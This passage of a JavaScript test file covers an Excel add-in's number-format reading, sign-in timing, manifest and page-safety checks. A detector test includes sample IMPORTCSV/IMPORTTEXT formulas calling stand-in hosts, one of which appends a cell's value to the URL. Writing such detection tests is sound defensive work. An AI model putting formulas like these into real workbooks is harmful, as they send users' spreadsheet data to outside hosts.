  assert.equal(X.cellOf(1234.5, '1 234,50 €', '#,##0.00 [$€-x-euro2]'), '1 234,50 €');
  assert.equal(X.cellOf(1234.5, '$1,234.50', '$#,##0.00'), '$1,234.50');
  assert.equal(X.cellOf(-1234.5, '($1,234.50)', '$#,##0.00_);($#,##0.00)'), '($1,234.50)');
  assert.equal(X.cellOf(100, 'USD 100.00', '[$USD] 0.00'), 'USD 100.00');
  assert.equal(X.cellOf(1234.5, '1’234.50 CHF', '#,##0.00 [$CHF]'), '1’234.50 CHF');
  assert.equal(X.cellOf(1.25, '1 1/4', '# ?/?'), '1 1/4');
  assert.equal(X.cellOf(5, '5 kg', '0 "kg"'), '5 kg');
  // Shown rounded: never the rounded text (R2X4); the exact value, with its unit.
  assert.equal(X.cellOf(0.12345, '12%', '0%'), '12.345%');
  assert.equal(X.cellOf(0.05, '####', '0%'), '5%');
  assert.equal(X.cellOf(1234.5678, '$1,234.57', '$#,##0.00'), '$1234.5678');
  assert.equal(X.cellOf(-1234.5678, '-1 234,57 €', '#,##0.00 €'), '-1234.5678 €');
  assert.equal(X.cellOf(-1234.5678, '($1,234.57)', '$#,##0.00_);($#,##0.00)'), '-$1234.5678');
  // No unit to keep, or none to read: the value, as before.
  assert.equal(X.cellOf(0, '$ -', '_($* #,##0_);_($* (#,##0);_($* "-"??_);_(@_)'), 0);
  assert.equal(X.cellOf(1234.5, '########', '$#,##0.00'), 1234.5);
  assert.equal(X.cellOf(0.3333, '1/3', '# ?/?'), 0.3333);
  assert.equal(X.cellOf(1234567, '1.2M', '0.0,,"M"'), 1234567, 'a scaled unit isn’t exact');
  assert.equal(X.cellOf(1234567, '$1,235K', '$#,##0,"K"'), 1234567, 'money in thousands: the value, never "$1234567K"');
  assert.equal(X.cellOf(-1234.5, '(1,234.50)', '#,##0.00_);(#,##0.00)'), -1234.5, 'no unit: the value');
  assert.equal(X.cellOf(3, '3', '"Red" 0'), 3, 'the shown number alone stays a number');
  assert.equal(X.cellOf(1234, '1,234', '#,##0'), 1234);
  assert.equal(X.cellOf(0.25, '25%'), 0.25, 'no format known: the value');
  for (const [f, u] of [['0%', 'percent'], ['0.00%', 'percent'], ['$#,##0.00', 'money'], ['[$€-x-euro2] #,##0.00', 'money'], ['_($* #,##0.00_)', 'money'], ['# ?/?', 'fraction'], ['0 "kg"', 'unit'], ['General', null], ['0.00', null], ['#,##0', null], ['[$-409]0.00', null], ['[Red]0.00', null], ['0.00E+00', null]]) assert.equal(X.unitOf(f), u, f);
  // Read back in the way its separators allow, and nothing else.
  assert.equal(X.readsBack('1.234,50 €', 1234.5), true);
  assert.equal(X.readsBack('1,234', 1.234), true);
  assert.equal(X.readsBack('1,234', 1234), true);
  assert.equal(X.readsBack('1,235', 1234), false);
  assert.equal(X.readsBack('Rs. 1,234.50', 1234.5), true);
  assert.equal(X.readsBack('-', 0), false);
  // A sheet like BREAK Z10's goes in its units, and the server takes it.
  const values = X.gridOf([['Sales', 'Ratio'], [1200, 1.25], [800, 0.5]], [['Sales', 'Ratio'], ['1 200,00 €', '125%'], ['800,00 €', '50%']], [['General', 'General'], ['#,##0.00 €', '0%'], ['#,##0.00 €', '0%']]);
  assert.deepEqual(values, [['Sales', 'Ratio'], ['1 200,00 €', '125%'], ['800,00 €', '50%']]);
  assert.equal(parseSheet(X.sheetBody({ action: 'analyze', sheet: { name: 'S', range: 'A1:B3', values } }).body).action, 'analyze');
  // Clean: a number cell is never written; its unit spelled another way is no change; another value is left as it is.
  const raw = [[1234.5], [0.05], [1234.5]];
  const formats = [['$#,##0.00'], ['0%'], ['$#,##0.00']];
  const sent = X.gridOf(raw, [['$1,234.50'], ['5%'], ['$1,234.50']], formats);
  const kinds = X.kindsOf(raw, formats);
  const changes = X.cleanChanges(sent, [['1234.50 USD'], ['5 %'], ['$1,234.60']], null, { kinds, raw, formats });
  assert.deepEqual([...changes], []);
  assert.equal(changes.kept, 1, 'only the changed amount is counted, never written');
  // =EDEN.ASK reads the same way (its range read loads text and numberFormat).
  const realFetch = globalThis.fetch;
  const realExcel = globalThis.Excel;
  try {
    storage.map.clear();
    X.saveToken(undefined, { access_token: 'es1.acc.id.secret', expires_in: 3600 });
    const { C, calls } = loadCells(async () => new Response('ok', { status: 200 }));
    globalThis.Excel = {
      run: async (fn) => fn({
        workbook: { worksheets: { getItem: () => ({ getRange: () => ({ getCell: () => ({ getResizedRange: () => ({ load() {}, values: [[0.05], [1234.5]], text: [['5%'], ['1 234,50 €']], numberFormat: [['0%'], ['#,##0.00 €']] }) }) }) }) } },
        sync: async () => {},
      }),
    };
    await C.ask('Which is bigger?', [[0.05], [1234.5]], { parameterAddresses: ['Z1', 'Data!A1:A2'] });
    assert.deepEqual(calls.at(-1).body.sheet.values, [['5%'], ['1 234,50 €']]);
  } finally {
    globalThis.fetch = realFetch;
    globalThis.Excel = realExcel;
    storage.map.clear();
  }
});

test('round 3 in the pane: the trailer without its header, Connect that can’t stall, desktop close, late codes, hidden neighbours, Fill formats, IMPORT* (R3X4–R3X10)', () => {
  const pane = read('taskpane.js');
  // R3X4: trailer text never reaches a cell: split at U+0000 always; none means the stream broke off.
  assert.deepEqual(X.trailerOf(null), { broken: true });
  assert.match(pane, /if \(at < 0\) return void \(text && onText\(text\)\);\s*if \(at\) onText\(text\.slice\(0, at\)\);\s*tail = text\.slice\(at \+ 1\);/);
  // R3X5: every look and the code's exchange end on their own; a 429 waits its Retry-After; one poller.
  assert.match(pane, /lookMs: 8000, redeemMs: 15_000/);
  assert.match(pane, /const timer = setTimeout\(\(\) => stop\.abort\(\), ms\);\s*try \{\s*const res = await fetch\(url, \{ \.\.\.init, signal: stop\.signal \}\);\s*return \{ res, body: await res\.json\(\)\.catch\(\(\) => \(\{\}\)\) \};/);
  assert.match(pane, /if \(got\.res\.status === 429\) \{\s*const secs = Number\(got\.res\.headers\.get\('retry-after'\)\);/);
  assert.match(pane, /fetchJson\(connectTiming\.redeemMs, '\/api\/eden\/token'/);
  // R3X7: only Excel on the web waits after 12006; Windows, Mac and iPad end as before ("The sign-in window closed").
  assert.match(pane, /const web = !platform \|\| platform === \(\(Office\.PlatformType && Office\.PlatformType\.OfficeOnline\) \|\| 'OfficeOnline'\);/);
  assert.match(pane, /const got = await take\(mine\.state\);\s*if \(job\.done \|\| job\.dialog\) return;\s*if \(got\.code\) return job\.got\(got\.code\);/, 'Connect pressed during the last looks: its window carries on');
  // R3X8: an attempt that ran out of time keeps being looked at (slowly, one look at a time) for lateMs; the words say so.
  assert.match(pane, /if \(keep\) lookLate\(\(late = \{ mine, until: Date\.now\(\) \+ connectTiming\.lateMs, timer: 0 \}\)\);/);
  assert.match(pane, /if \(late !== rec \|\| token \|\| Date\.now\(\) > rec\.until\) return;/);
  assert.match(pane, /latePollMs: 10_000/);
  for (const lang of ['en', 'fr']) assert.ok(X.STRINGS[lang].connectExpired.length > 60, `${lang}: says a late sign-in still connects`);
  assert.match(X.STRINGS.en.connectExpired, /still connects by itself/);
  assert.match(X.STRINGS.en.landingRelayed, /If it doesn’t show Connected, press Connect there/);
  assert.match(X.STRINGS.fr.landingRelayed, /S’il n’affiche pas Connecté, appuyez sur Connecter/);
  // R3X6: hidden neighbour columns with data get the hidden notice; a hidden empty one doesn't end the columns.
  assert.match(pane, /return \{ hidden: own\.rows \+ own\.columns, view: own, next, beside: besideView \? hiddenIn\(besideView, beside\.width\) : null \};/);
  assert.match(pane, /range\.getColumn\(i\)\.load\('columnHidden'\)/);
  assert.match(pane, /hidden = nearHidden\.rows \+ sentHidden;/);
  // R3X9: a number into a date format, or a percentage, gets its own format.
  assert.match(pane, /const reset = typeof w\.v === 'number' && \(X\.isDateFormat\(was\) \|\| \/%\$\/\.test\(w\.format \|\| ''\)\);/);
  assert.match(pane, /numberFormat\[r\]\.push\(w\.asText \? '@' : general \|\| reset \? w\.format \|\| 'General' : was\);/);
  // R3X10: IMPORTTEXT, IMPORTCSV (and any IMPORT… to come) read files and web addresses: flagged.
  assert.deepEqual(X.reachesOut('=IMPORTCSV("https://x.example/a.csv")'), ['IMPORTCSV']);
  assert.deepEqual(X.reachesOut('=_xlfn.IMPORTTEXT("https://x/?"&A1)'), ['IMPORTTEXT']);
  assert.deepEqual(X.reachesOut('=importcsv(A1)+IMPORTCSV(B1)'), ['IMPORTCSV']);
  assert.deepEqual(X.reachesOut('=A1&"IMPORTCSV("'), [], 'words inside text are fine');
  assert.deepEqual(X.reachesOut('=MYIMPORT(A1)'), []);
});

test('the pane asks Excel in few round trips, and a closed pane doesn’t follow the selection', () => {
  const pane = read('taskpane.js');
  // readFor: the selection (and, for formula, explain and fill, the data's extent) in the first sync.
  const first = pane.slice(pane.indexOf('function readFor('), pane.indexOf('const { range, dim } = clipped('));
  assert.ok(first.length > 200 && first.length < 3000, 'readFor up to the clip');
  assert.match(first, /sel\.load\('address,rowCount,columnCount,rowIndex,columnIndex'\)[\s\S]*getUsedRangeOrNullObject\(true\)[\s\S]*await context\.sync\(\)/);
  assert.match(first, /const used = action === 'table' \? null : ws\.getUsedRangeOrNullObject\(true\);/, 'e2: the data’s extent in the first trip for every read');
  assert.equal((first.match(/context\.sync\(\)/g) || []).length, 1);
  // e2: clipping a whole column is arithmetic on the first trip's numbers, not a trip of its own.
  const clip = pane.slice(pane.indexOf('function clipped('), pane.indexOf('function besideOf('));
  assert.doesNotMatch(clip, /sync\(\)|async/);
  // The cells come with their visible view (hidden rows), Fill's target and (Fill right of the data) the
  // columns beside it, with a one-at-a-time fallback.
  assert.match(pane, /async function cellsWith\(context, range, fields, rows, columns, right, beside\)/);
  assert.match(pane, /dim\.columnIndex >= used\.columnIndex \+ used\.columnCount \? besideOf\(ws, dim, used\) : null;/);
  // The relay: one look at a time and one poll timer per Connect attempt, even when the window opens again during a look (e2).
  assert.match(pane, /if \(job\.done \|\| job\.looking\) return;\s*job\.looking = true;\s*let wait = 0;\s*try \{/);
  assert.match(pane, /\} finally \{\s*job\.looking = false;\s*if \(!job\.done\) job\.next\(wait\);\s*\}/, 'the next look is set whatever the look did (R3X5)');
  assert.match(pane, /clearTimeout\(job\.timer\);\s*job\.timer = setTimeout\(job\.poll, Math\.max\(job\.delay, wait\)\);\s*\};/);
  // Apply: the sheet check and the reads it needs in one trip; a failed trip still says "gone" or "protected".
  assert.match(pane, /async function sheetFor\(context, job, read\)/);
  assert.match(pane, /const found = read \? await sheetFor\(context, job\)\.catch\(\(\) => null\) : null;/);
  assert.match(pane, /Office\.addin && Office\.addin\.onVisibilityModeChanged/);
  assert.match(pane, /if \(!paneHidden\) selTimer = setTimeout\(showSelection, 120\)/, 'selection changes stay debounced');
  assert.equal(X.isFormula('=A1'), true);
  assert.equal(X.isFormula('A1'), false);
  assert.equal(X.isFormula(3), false);
});

// ── the files ──

/** A small XML well-formedness check: tags nest, attributes are quoted, entities are known. */
function wellFormed(xml) {
  const body = xml.replace(/^﻿?<\?xml[^?]*\?>\s*/, '').replace(/<!--[\s\S]*?-->/g, '');
  const stack = [];
  let pos = 0;
  const tag = /<(\/?)([A-Za-z_][\w:.-]*)((?:\s+[A-Za-z_][\w:.-]*\s*=\s*(?:"[^"<]*"|'[^'<]*'))*)\s*(\/?)>/g;
  for (const m of body.matchAll(tag)) {
    const text = body.slice(pos, m.index);
    if (/[<>]/.test(text)) throw new Error(`stray markup before ${m[0]}`);
    if (/&(?!(amp|lt|gt|quot|apos|#\d+|#x[0-9a-f]+);)/i.test(text + m[3])) throw new Error(`bad entity near ${m[0]}`);
    if (m[1]) {
      if (stack.pop() !== m[2]) throw new Error(`mismatched </${m[2]}>`);
    } else if (!m[4]) stack.push(m[2]);
    pos = m.index + m[0].length;
  }
  if (/[<>]/.test(body.slice(pos))) throw new Error('stray markup at the end');
  if (stack.length) throw new Error(`unclosed <${stack.at(-1)}>`);
  return true;
}

test('the manifest: well-formed, shared runtime, EDEN namespace, every address on askeden.com and present', () => {
  const raw = read('manifest.xml');
  assert.ok(wellFormed(raw));
  const xml = raw.replace(/<!--[\s\S]*?-->/g, '');
  assert.throws(() => wellFormed('<a><b></a>'), /mismatched/);
  assert.match(xml, /<OfficeApp [^>]*xsi:type="TaskPaneApp"/);
  assert.match(xml, /xmlns="http:\/\/schemas\.microsoft\.com\/office\/appforoffice\/1\.1"/);
  assert.match(xml, /<Id>[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}<\/Id>/);
  assert.match(xml, /<ProviderName>Harrat Global Holdings, Inc\.<\/ProviderName>/);
  assert.match(xml, /<DisplayName DefaultValue="Ask Eden"/);
  assert.match(xml, /<Host Name="Workbook"\/>/);
  assert.match(xml, /<Set Name="SharedRuntime" MinVersion="1\.1"\/>/);
  assert.match(xml, /<Runtime resid="Taskpane\.Url" lifetime="long"\/>/);
  assert.match(xml, /<ExtensionPoint xsi:type="CustomFunctions">/);
  assert.match(xml, /<bt:String id="Functions\.Namespace" DefaultValue="EDEN"\/>/);
  assert.match(xml, /<OfficeTab id="TabHome">/);
  assert.match(xml, /<AppDomain>https:\/\/askeden\.com<\/AppDomain>/);
  assert.match(xml, /<SupportUrl DefaultValue="https:\/\/askeden\.com\/help"\/>/);
  assert.match(xml, /<SourceLocation DefaultValue="https:\/\/askeden\.com\/addins\/excel\/taskpane\.html"\/>/);
  // Every resid used is defined, and the order of OfficeApp's children is the schema's.
  const defined = new Set([...xml.matchAll(/<bt:(?:Image|Url|String) id="([^"]+)"/g)].map((m) => m[1]));
  for (const [, id] of xml.matchAll(/resid="([^"]+)"/g)) assert.ok(defined.has(id), `resid ${id} defined`);
  for (const id of defined) assert.ok(id.length <= 32, `resid ${id} at most 32 characters`);
  const order = ['Id', 'Version', 'ProviderName', 'DefaultLocale', 'DisplayName', 'Description', 'IconUrl', 'HighResolutionIconUrl', 'SupportUrl', 'AppDomains', 'Hosts', 'Requirements', 'DefaultSettings', 'Permissions', 'VersionOverrides'];
  const at = order.map((name) => xml.indexOf(`<${name}`));
  assert.ok(at.every((i, n) => i > 0 && (n === 0 || i > at[n - 1])), 'OfficeApp children in schema order');
  // Strings within the schema's lengths (short 125, long 250).
  for (const [, value] of xml.matchAll(/(?:DefaultValue|Value)="([^"]*)"/g)) assert.ok(value.replace(/&quot;/g, '"').length <= 250, value.slice(0, 40));
  const urls = [...xml.matchAll(/https:\/\/askeden\.com\/addins\/excel\/([^"<]+)/g)].map((m) => m[1]);
  assert.ok(urls.length >= 6);
  for (const name of urls) {
    assert.match(name, /^[a-z0-9-]+\.(html|js|css|json|xml|png|svg)$/, `${name} is a name addins.js serves`);
    assert.ok(existsSync(join(DIR, name)), `${name} exists`);
  }
  for (const [, url] of xml.matchAll(/"(https?:\/\/[^"]+)"/g)) if (!/^http:\/\/(schemas\.microsoft\.com|www\.w3\.org)\//.test(url)) assert.match(url, /^https:\/\/askeden\.com\//, url);
});

test('the functions metadata: ASK(prompt, [range])', () => {
  const meta = JSON.parse(read('functions.json'));
  const [fn] = meta.functions;
  assert.equal(meta.functions.length, 1);
  assert.equal(fn.id, 'ASK');
  assert.equal(fn.name, 'ASK');
  assert.equal(fn.result.type, 'any', 'a plain number answer is a number');
  assert.equal(fn.result.dimensionality, 'matrix', 'requiresParameterAddresses needs a matrix result');
  assert.equal(fn.options.requiresParameterAddresses, true, 'the range’s address, to read dates as shown');
  assert.equal(meta.allowErrorForDataTypeAny, true, 'a range with an error still reaches ASK');
  assert.deepEqual(fn.parameters.map((p) => [p.name, p.optional === true]), [['prompt', false], ['range', true]]);
  assert.equal(fn.parameters[1].dimensionality, 'matrix');
  assert.match(read('functions.js'), /CustomFunctions\.associate\('ASK', ask\)/);
});

test('the pages: no inline scripts or handlers, every referenced file there, names addins.js serves', () => {
  const names = readdirSync(DIR);
  for (const name of names) if (name !== 'README.md') assert.match(name, /^[a-z0-9-]+\.(html|js|css|json|xml|png|svg)$/, name);
  for (const page of names.filter((n) => n.endsWith('.html'))) {
    const html = read(page);
    for (const [, attrs, inner] of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
      assert.match(attrs, /\bsrc="/, `${page}: every script has a src`);
      assert.equal(inner.trim(), '', `${page}: no inline script`);
    }
    assert.doesNotMatch(html, /\son[a-z]+\s*=/i, `${page}: no inline event handlers`);
    assert.doesNotMatch(html, /javascript:/i, `${page}: no javascript: URLs`);
    for (const [, ref] of html.matchAll(/(?:src|href)="([^"]+)"/g)) {
      if (/^https:\/\/appsforoffice\.microsoft\.com\/lib\/1\/hosted\/office\.js$/.test(ref)) continue;
      if (/^https:\/\/askeden\.com\//.test(ref)) continue; // links out (plan, help)
      assert.ok(!/^[a-z]+:/i.test(ref), `${page}: ${ref} is local`);
      assert.ok(existsSync(join(DIR, ref)), `${page}: ${ref} exists`);
    }
  }
  assert.match(read('taskpane.html'), /<script src="functions\.js"><\/script>/, 'the cell function lives in the pane’s runtime');
  // The pane never writes model text as HTML.
  for (const js of ['taskpane.js', 'functions.js', 'connected.js', 'lib.js']) assert.doesNotMatch(read(js), /innerHTML|outerHTML|insertAdjacentHTML|document\.write/, js);
});
